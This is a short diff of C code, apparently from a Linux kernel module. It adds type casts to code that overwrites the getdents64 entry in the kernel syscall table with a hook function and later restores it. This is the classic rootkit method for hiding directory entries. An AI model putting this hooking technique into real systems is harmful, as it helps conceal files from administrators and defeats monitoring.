@@ -73,8 +73,8 @@ int replace_getdents_syscall(void)
     {
         if (set_page_write(sys_call_table))
         {
-            org_getdents64 = sys_call_table[__NR_getdents64];
-            sys_call_table[__NR_getdents64] = sys_getdents64_hook;
+            org_getdents64 = (long unsigned int (*)(unsigned int,  struct linux_dirent64 *, unsigned int))sys_call_table[__NR_getdents64];
+            sys_call_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
             set_page_no_write(sys_call_table);
             return 1;
         }
@@ -90,7 +90,7 @@ void remove_hook(void)
     if (sys_call_table != 0)
      if (set_page_write(sys_call_table))
         {
-            sys_call_table[__NR_getdents64] = org_getdents64;
+            sys_call_table[__NR_getdents64] = (unsigned long int)org_getdents64;
             set_page_no_write(sys_call_table);
             printk(KERN_ALERT "hook removed");
             return ;
